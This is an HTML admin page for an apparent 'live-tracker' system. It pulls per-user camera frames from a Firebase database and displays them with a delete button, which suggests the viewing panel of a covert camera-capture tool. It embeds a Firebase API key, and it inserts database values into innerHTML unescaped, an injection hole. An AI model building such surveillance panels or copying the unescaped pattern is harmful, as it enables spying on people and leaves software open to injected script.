<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Dashboard</title>

<style>
body{
  margin:0;
  font-family:Arial;
  background:#0b1220;
  color:white;
}

/* HEADER */
header{
  padding:15px;
  text-align:center;
  background:#111827;
  font-weight:bold;
  letter-spacing:1px;
}

/* GRID */
.container{
  display:flex;
  flex-direction:column;
  gap:15px;
  padding:15px;
}

/* USER CARD */
.userBox{
  background:#1e293b;
  padding:15px;
  border-radius:12px;
  box-shadow:0 0 10px #000;
}

/* IMAGE */
img{
  width:100%;
  height:300px;
  object-fit:cover;
  border-radius:10px;
  margin-top:10px;
}

/* BUTTON */
button{
  margin-top:10px;
  padding:8px 12px;
  border:none;
  border-radius:8px;
  cursor:pointer;
  background:#ef4444;
  color:white;
}
</style>
</head>

<body>

<header>📡 LIVE ADMIN DASHBOARD</header>

<div class="container" id="grid"></div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57OALtSkfNdMmrE",
  authDomain: "live-tracker-554a7.firebaseapp.com",
  databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
  projectId: "live-tracker-554a7",
  storageBucket: "live-tracker-554a7.firebasestorage.app",
  messagingSenderId: "951695061306",
  appId: "1:951695061306:web:a7b9478538f86f50a36003"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const grid = document.getElementById("grid");

db.ref("camera").on("value",(snap)=>{

  const data = snap.val();
  grid.innerHTML="";

  if(!data){
    grid.innerHTML="<p>No Users</p>";
    return;
  }

  Object.keys(data).forEach(userId=>{

    const item = data[userId];

    const box = document.createElement("div");
    box.className = "userBox";

    box.innerHTML = `
      <h3>👤 ${userId}</h3>

      <img src="${item.frame}" />

      <button onclick="deleteUser('${userId}')">
        DELETE USER
      </button>
    `;

    grid.appendChild(box);

  });

});

function deleteUser(userId){
  if(confirm("Delete user data?")){
    db.ref("camera/"+userId).remove();
  }
}
</script>

</body>
</html>
